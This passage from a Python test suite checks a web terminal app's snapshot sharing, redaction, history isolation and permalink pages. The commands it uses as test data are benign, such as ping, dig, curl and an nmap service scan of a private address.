                json={"label": "large snapshot", "content": content},
                headers={"X-Session-ID": session_id},
            )
            share_id = json.loads(create_resp.data)["id"]
            with db_connect() as conn:
                stored = conn.execute(
                    "SELECT content FROM snapshots WHERE id = ?",
                    (share_id,),
                ).fetchone()["content"]
            pointer = body_store.stored_body_pointer(stored)
            assert pointer is not None
            body_path = os.path.join(tmp, pointer["rel_path"])
            assert os.path.exists(body_path)

            fetch_resp = client.get(f"/share/{share_id}?json", headers={"X-Session-ID": session_id})
            delete_resp = client.delete(f"/share/{share_id}", headers={"X-Session-ID": session_id})

            assert fetch_resp.status_code == 200
            assert json.loads(fetch_resp.data)["content"] == content
            assert delete_resp.status_code == 200
            assert not os.path.exists(body_path)

    def test_post_does_not_link_snapshot_to_source_run_project(self):
        client = get_client()
        session = "share-project-" + uuid.uuid4().hex[:8]
        run_id = "run-" + uuid.uuid4().hex
        project_resp = client.post(
            "/projects",
            json={"name": "Snapshot Source"},
            headers={"X-Session-ID": session},
        )
        project = json.loads(project_resp.data)["project"]
        conn = sqlite3.connect(DB_PATH)
        try:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (run_id, session, "theme list"),
            )
            conn.commit()
        finally:
            conn.close()
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id, "source": "manual"},
            headers={"X-Session-ID": session},
        )
        assert link_resp.status_code == 201

        resp = client.post(
            "/share",
            json={"label": "linked snapshot", "content": ["line1"], "run_id": run_id},
            headers={"X-Session-ID": session},
        )
        assert resp.status_code == 200
        assert "id" in json.loads(resp.data)

        conn = sqlite3.connect(DB_PATH)
        try:
            row = conn.execute(
                "SELECT entity_type, entity_id, source FROM project_links "
                "WHERE project_id = ? AND entity_type = 'snapshot'",
                (project["id"],),
            ).fetchone()
        finally:
            conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
            conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()
        assert row is None

    def test_post_rejects_non_string_label(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": 123, "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Label must be a string"

    def test_post_rejects_non_list_content(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": {"text": "line"}},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content must be a list"

    def test_post_rejects_invalid_content_item(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": ["ok", 123]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content items must be strings or objects"

    def test_post_rejects_content_object_without_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": 123, "cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_cls(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": "hello", "cls": 123}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must use string cls values"

    def test_post_accepts_renderable_content_objects(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "good content",
                "content": [
                    {"text": "$ echo hi", "cls": "cmd", "tsC": "2026-01-01 00:00:00"},
                    {"text": "hi", "cls": "notice"},
                ],
            },
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data

    def test_post_applies_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [
                {"pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": ""},
            ],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "good content",
                    "content": [
                        {"text": "Authorization: Bearer abc123", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "Authorization: Bearer [redacted]"

    def test_post_applies_builtin_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "builtin redaction",
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact [email-redacted] at [ip-redacted]"

    def test_post_skips_share_redaction_when_apply_redaction_false(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "raw share",
                    "apply_redaction": False,
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact admin@example.com at 203.0.113.10"

    def test_post_rejects_non_boolean_apply_redaction(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "bad share",
                "apply_redaction": "yes",
                "content": [{"text": "line 1", "cls": ""}],
            },
            headers={"X-Session-ID": "test-session"},
        )
        assert resp.status_code == 400
        data = json.loads(resp.data)
        assert data["error"] == "apply_redaction must be a boolean"

    def test_post_rejects_non_object_json(self):
        client = get_client()
        resp = client.post(
            "/share",
            json=["bad", "payload"],
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"

    def test_get_nonexistent_share_returns_404(self):
        client = get_client()
        resp = client.get("/share/nonexistent-share-id")
        assert resp.status_code == 404

    def test_delete_share_removes_snapshot_for_current_session(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "delete-me", "content": ["line"]},
            headers={"X-Session-ID": "delete-share-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        label_resp = client.post(
            f"/entities/snapshot/{share_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": "delete-share-session"},
        )
        note_resp = client.put(
            f"/entities/snapshot/{share_id}/note",
            json={"body": "Snapshot context"},
            headers={"X-Session-ID": "delete-share-session"},
        )
        assert label_resp.status_code == 201
        assert note_resp.status_code == 200

        resp = client.delete(
            f"/share/{share_id}",
            headers={"X-Session-ID": "delete-share-session"},
        )

        assert resp.status_code == 200
        assert json.loads(resp.data) == {"ok": True}
        assert client.get(f"/share/{share_id}").status_code == 404
        with sqlite3.connect(DB_PATH) as conn:
            label_count = conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
            note_count = conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
        assert label_count == 0
        assert note_count == 0

    def test_bulk_delete_shares_reports_partial_results_and_removes_metadata(self):
        client = get_client()
        session_id = "bulk-delete-share-session"
        other_session_id = "bulk-delete-share-other"

        create_resp = client.post(
            "/share",
            json={"label": "delete-me", "content": ["line"]},
            headers={"X-Session-ID": session_id},
        )
        share_id = json.loads(create_resp.data)["id"]
        other_resp = client.post(
            "/share",
            json={"label": "keep-me", "content": ["line"]},
            headers={"X-Session-ID": other_session_id},
        )
        other_share_id = json.loads(other_resp.data)["id"]
        label_resp = client.post(
            f"/entities/snapshot/{share_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        note_resp = client.put(
            f"/entities/snapshot/{share_id}/note",
            json={"body": "Snapshot context"},
            headers={"X-Session-ID": session_id},
        )
        assert label_resp.status_code == 201
        assert note_resp.status_code == 200

        resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": [share_id, other_share_id, "missing-share"]},
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["counts"] == {"deleted": 1, "not_found": 2, "rejected": 0}
        assert data["results"] == [
            {"snapshot_id": share_id, "status": "deleted"},
            {"snapshot_id": other_share_id, "status": "not_found"},
            {"snapshot_id": "missing-share", "status": "not_found"},
        ]
        with sqlite3.connect(DB_PATH) as conn:
            remaining_ids = {
                row[0]
                for row in conn.execute(
                    "SELECT id FROM snapshots WHERE id IN (?, ?)",
                    (share_id, other_share_id),
                ).fetchall()
            }
            label_count = conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
            note_count = conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
        assert remaining_ids == {other_share_id}
        assert label_count == 0
        assert note_count == 0

    def test_bulk_delete_shares_rejects_malformed_ids(self):
        client = get_client()
        session_id = "bulk-delete-share-malformed"
        overlong_id = "s" * 513

        non_string_resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": ["snap-ok", {"bad": "id"}]},
            headers={"X-Session-ID": session_id},
        )
        assert non_string_resp.status_code == 400
        assert json.loads(non_string_resp.data) == {"error": "snapshot_ids entries must be strings"}

        overlong_resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": [overlong_id]},
            headers={"X-Session-ID": session_id},
        )
        assert overlong_resp.status_code == 400
        assert json.loads(overlong_resp.data) == {"error": "snapshot_ids entries are too long", "limit": 512}

        too_many_resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": [f"snap-{index}" for index in range(101)]},
            headers={"X-Session-ID": session_id},
        )
        assert too_many_resp.status_code == 400
        assert json.loads(too_many_resp.data) == {"error": "too_many", "limit": 100}

    def test_get_share_json_returns_content(self):
        client = get_client()
        # Create a snapshot first
        create_resp = client.post(
            "/share",
            json={"label": "my label", "content": ["hello", "world"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]

        # Fetch it as JSON
        resp = client.get(f"/share/{share_id}?json")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["label"] == "my label"
        assert "hello" in data["content"]

    def test_get_share_html_returns_page(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "html test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert resp.status_code == 200
        assert b"<html" in resp.data.lower()

    def test_get_share_html_honors_theme_name_cookie(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "theme selector test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        client.set_cookie("pref_theme_name", "apricot_sand")
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'class="permalink-page"' in body
        assert 'data-theme="apricot_sand"' in body
        assert '/static/css/styles.css' in body

    def test_get_share_html_contains_label(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "unique-label-xyz", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert b"unique-label-xyz" in resp.data

    def test_get_share_html_does_not_prepend_label_for_structured_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "curl http://localhost:5001/config",
                "content": [
                    {"text": "$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                    {"text": "[process exited with code 0 in 0.1s]", "cls": "exit-ok"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        assert "$ ping -c 4 [host-redacted]" in body
        assert "$ curl http://localhost:5001/config" not in body

    def test_get_share_html_includes_prompt_echo_renderer_for_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "prompt-style-test",
                "content": [
                    {"text": "anon@darklab:~$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        # renderPromptEcho is now in the external permalink.js module; the page
        # loads it and bridges data via window.PermData.  Confirm both are present.
        assert "permalink.js" in body
        assert "prompt-echo" in body

    def test_get_share_html_content_type(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "ct-test", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert "text/html" in resp.content_type

    def test_get_share_html_includes_permalink_display_toggles(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "toggle-test",
                "content": [
                    {"text": "line 1", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'id="toggle-ln"' in body
        assert 'id="toggle-ts"' in body
        assert 'timestamps unavailable' not in body

    def test_get_share_html_shows_line_count_meta(self):
        from config import APP_VERSION
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "meta-lines-test", "content": ["a", "b", "c"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "lines" in body
        assert f"v{APP_VERSION}" in body

    def test_get_share_html_does_not_show_exit_code_badge(self):
        """Snapshots have no exit code — the badge must not appear."""
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "no-exit-test", "content": ["output line"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "meta-badge" not in body


# ── /welcome ──────────────────────────────────────────────────────────────────

class TestWelcomeRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome")
        assert resp.status_code == 200

    def test_returns_list(self):
        client = get_client()
        data = json.loads(client.get("/welcome").data)
        assert isinstance(data, list)

    def test_returns_cmd_and_out_fields_when_configured(self):
        client = get_client()
        mock_blocks = [{"cmd": "ping google.com", "out": "64 bytes"}]
        with mock.patch("blueprints.content.load_welcome", return_value=mock_blocks):
            data = json.loads(client.get("/welcome").data)
        assert len(data) == 1
        assert data[0]["cmd"] == "ping google.com"
        assert data[0]["out"] == "64 bytes"

    def test_returns_empty_list_when_no_welcome_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_welcome", return_value=[]):
            data = json.loads(client.get("/welcome").data)
        assert data == []


# ── /autocomplete ─────────────────────────────────────────────────────────────

class TestAutocompleteRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/autocomplete")
        assert resp.status_code == 200

    def test_has_suggestions_key(self):
        client = get_client()
        data = json.loads(client.get("/autocomplete").data)
        assert "suggestions" in data
        assert isinstance(data["suggestions"], list)
        assert "context" in data
        assert isinstance(data["context"], dict)
        assert "builtin_command_roots" in data
        assert "commands" in data["builtin_command_roots"]
        assert "ip" in data["builtin_command_roots"]
        assert "status" in data["builtin_command_roots"]

    def test_returns_configured_context(self):
        client = get_client()
        with mock.patch("blueprints.content.load_autocomplete_context_from_commands_registry", return_value={
            "nmap": {"flags": []},
        }):
            data = json.loads(client.get("/autocomplete").data)
        assert data["suggestions"] == []
        assert "nmap" in data["context"]

    def test_returns_wordlist_autocomplete_catalog(self):
        client = get_client()
        with mock.patch("blueprints.content.wordlist_autocomplete_items", return_value=[
            {
                "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "label": "Discovery/DNS/subdomains-top1million-5000.txt",
                "description": "DNS wordlist",
                "wordlist_category": "dns",
            },
        ]):
            data = json.loads(client.get("/autocomplete").data)

        assert data["wordlists"][0]["wordlist_category"] == "dns"
        assert data["wordlists"][0]["value"].endswith("subdomains-top1million-5000.txt")


# ── /history session isolation ────────────────────────────────────────────────

class TestHistorySessionIsolation:
    def test_empty_history_for_fresh_session(self):
        client = get_client()
        data = json.loads(client.get(
            "/history", headers={"X-Session-ID": "fresh-session-no-runs-xyz"}
        ).data)
        assert data["runs"] == []

    def test_history_scoped_to_session(self):
        session_a = "isolation-test-session-A"
        session_b = "isolation-test-session-B"
        run_id = "isolation-test-run-id-001"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) "
            "VALUES (?, ?, ?, datetime('now'))",
            (run_id, session_a, "ping isolation-test")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            runs_a = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_a}
            ).data)["runs"]
            runs_b = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_b}
            ).data)["runs"]
            assert any(r["id"] == run_id for r in runs_a)
            assert not any(r["id"] == run_id for r in runs_b)
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
            conn.commit()
            conn.close()

    def test_delete_only_affects_own_session(self):
        session_a = "delete-test-session-A"
        session_b = "delete-test-session-B"
        run_a = "delete-test-run-A"
        run_b = "delete-test-run-B"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_a, session_a, "ping a")
        )
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_b, session_b, "ping b")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            client.delete("/history", headers={"X-Session-ID": session_a})
            # Session B's run should be unaffected
            conn = sqlite3.connect(DB_PATH)
            count = conn.execute(
                "SELECT COUNT(*) FROM runs WHERE id=?", (run_b,)
            ).fetchone()[0]
            conn.close()
            assert count == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id IN (?, ?)", (run_a, run_b))
            conn.commit()
            conn.close()


# ── /history/<run_id> permalink ───────────────────────────────────────────────

class TestRunPermalinkRoute:
    def _insert_run(
        self,
        run_id,
        command,
        output=None,
        *,
        preview_truncated=0,
        full_output_available=0,
        full_output_truncated=0,
        full_output_lines=None,
        artifacts=None,
    ):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, output_preview, preview_truncated, "
            "output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, datetime('now'), ?, ?, ?, ?, ?)",
            (
                run_id,
                command,
                json.dumps(output or []),
                preview_truncated,
                len(output or []),
                full_output_available,
                full_output_truncated,
            )
        )
        if full_output_available and full_output_lines is not None:
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, ?, ?, datetime('now'))",
                (
                    run_id,
                    f"{run_id}.txt.gz",
                    len("\n".join(full_output_lines).encode()),
                    len(full_output_lines),
                    full_output_truncated,
                ),
            )
        for artifact in artifacts or []:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, 'test-session', ?, ?, ?, ?, ?, ?, datetime('now'))",
                (
                    artifact["id"],
                    run_id,
                    artifact["workspace_path"],
                    artifact.get("display_name", ""),
                    artifact.get("kind", "unknown"),
                    artifact.get("byte_size", 0),
                    artifact.get("detected_by", "manual"),
                ),
            )
        conn.commit()
        conn.close()
        if full_output_available and full_output_lines is not None:
            import gzip
            from services.runs.output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
            ensure_run_output_dir()
            with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                for line in full_output_lines:
                    f.write(line + "\n")

    def _delete_run(self, run_id):
        from services.runs.output_store import RUN_OUTPUT_DIR
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM findings WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM entity_labels WHERE entity_id=?", (run_id,))
        conn.execute("DELETE FROM entity_notes WHERE entity_id=?", (run_id,))
        conn.execute("DELETE FROM run_file_artifacts WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM run_output_artifacts WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
        conn.commit()
        conn.close()
        try:
            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
        except FileNotFoundError:
            pass

    def test_html_view_returns_200(self):
        run_id = "permalink-html-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert resp.status_code == 200
            assert b"<html" in resp.data.lower()
        finally:
            self._delete_run(run_id)

    def test_html_view_contains_command(self):
        run_id = "permalink-cmd-test-run"
        self._insert_run(
            run_id,
            "nmap -sV 10.0.0.1",
            artifacts=[{
                "id": "permalink-html-artifact",
                "workspace_path": "reports/nmap.txt",
                "display_name": "nmap.txt",
                "kind": "output",
                "byte_size": 64,
                "detected_by": "workspace_flag",
            }],
        )
        with db_connect() as conn:
            materialize_run_entities(
                conn,
                "test-session",
                run_id,
                [{"text": "darklab.sh", "entities": [{"type": "domain", "value": "darklab.sh"}]}],
                seen_at="2026-05-17T00:00:01+00:00",
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, 'test-session', ?, 'finding', 'open service', 'open service', 0, ?, datetime('now'))",
                ("permalink-html-atlas-finding", run_id, "fp-permalink-html-atlas"),
            )
            conn.commit()
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"nmap -sV 10.0.0.1" in resp.data
            assert b"1 artifact" in resp.data
            assert b"1 Atlas entity" in resp.data
            assert b"1 Atlas finding" in resp.data
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_command(self):
        run_id = "permalink-json-test-run"
        self._insert_run(
            run_id,
            "dig google.com",
            ["answer section"],
            artifacts=[{
                "id": "permalink-json-artifact",
                "workspace_path": "reports/dig.txt",
                "display_name": "dig.txt",
                "kind": "output",
                "byte_size": 128,
                "detected_by": "workspace_flag",
            }],
        )
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO findings "
            "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
            "VALUES (?, 'test-session', ?, 'finding', 'answer found', 'answer section', 0, ?, datetime('now'))",
            ("permalink-json-finding", run_id, "fp-permalink-json"),
        )
        conn.execute(
            "INSERT INTO entity_labels "
            "(id, session_id, entity_type, entity_id, label, created) "
            "VALUES (?, 'test-session', 'run', ?, 'baseline', datetime('now'))",
            ("permalink-json-label", run_id),
        )
        conn.execute(
            "INSERT INTO entity_notes "
            "(id, session_id, entity_type, entity_id, body, created, updated) "
            "VALUES (?, 'test-session', 'run', ?, 'review note', datetime('now'), datetime('now'))",
            ("permalink-json-note", run_id),
        )
        conn.commit()
        conn.close()
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
            assert data["artifact_count"] == 1
            assert data["artifacts"][0]["workspace_path"] == "reports/dig.txt"
            assert data["finding_count"] == 1
            assert data["label_count"] == 1
            assert data["note_count"] == 1
        finally:
            self._delete_run(run_id)

    def test_json_view_is_a_bearer_permalink_across_sessions(self):
        run_id = "permalink-other-session-test-run"
        self._insert_run(run_id, "dig google.com", ["answer section"])
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "other-session"},
                ).data
            )
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_full_output_when_artifact_exists(self):
        run_id = "permalink-json-full-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "man curl"
            assert data["output"] == ["full line 1", "full line 2"]
        finally:
            self._delete_run(run_id)

    def test_json_preview_view_returns_preview_when_requested(self):
        run_id = "permalink-json-preview-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview line"],
            preview_truncated=1,
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "man curl"
            assert data["output"] == ["preview line"]
            assert (
                "To view the full output, use either permalink button now; "
                "after another command, use this command's history permalink"
                in data["preview_notice"]
            )
        finally:
            self._delete_run(run_id)

    def test_html_content_type(self):
        run_id = "permalink-ct-test-run"
        self._insert_run(run_id, "ping test")
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert "text/html" in resp.content_type
        finally:
            self._delete_run(run_id)

    def test_permalink_uses_full_output_when_available(self):
        run_id = "permalink-full-link-test-run"
        self._insert_run(
            run_id,
            "nmap -sV 10.0.0.1",
            ["preview line"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"full line 1" in resp.data
            assert b"preview line" not in resp.data
        finally:
            self._delete_run(run_id)

    def test_preview_page_appends_truncation_notice_when_no_full_output_exists(self):
        run_id = "permalink-preview-truncated-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1", ["preview"], preview_truncated=1, full_output_available=0)
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"preview truncated" in resp.data
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_line_number_toggle_and_disables_timestamps_without_metadata(self):
        run_id = "permalink-toggle-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            body = resp.get_data(as_text=True)
            assert 'id="toggle-ln"' in body
            assert 'id="toggle-ts" disabled' in body
            assert 'timestamps unavailable for this permalink' in body
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_prompt_echo_and_enabled_timestamps_for_structured_run_output(self):
        run_id = "permalink-structured-toggle-test-run"
        structured_preview = [
            {"text": "64 bytes from 8.8.8.8", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
        ]
        self._insert_run(run_id, "ping google.com", structured_preview)
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            body = resp.get_data(as_text=True)
            assert "$ ping google.com" in body
            assert 'id="toggle-ts"' in body
            assert 'timestamps unavailable for this permalink' not in body
        finally:
            self._delete_run(run_id)

    def _insert_run_with_meta(self, run_id, command, exit_code, started, finished, output=None):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, "
            "preview_truncated, output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, ?, ?, ?, ?, 0, ?, 0, 0)",
            (
                run_id, command, started, finished, exit_code,
                json.dumps(output or []), len(output or []),
            )
        )
        conn.commit()
        conn.close()

    def test_html_view_shows_exit_code_zero_badge(self):
        run_id = "permalink-meta-exit0-run"
        self._insert_run_with_meta(
            run_id, "curl http://example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:05",
            ["HTTP/1.1 200 OK"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "exit 0" in body
            assert "meta-badge-ok" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_nonzero_exit_code_badge(self):
        run_id = "permalink-meta-exitfail-run"
        self._insert_run_with_meta(
            run_id, "curl http://missing.invalid", 6,
            "2026-04-10T10:00:00", "2026-04-10T10:00:02",
            ["curl: (6) Could not resolve host"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "exit 6" in body
            assert "meta-badge-fail" in body
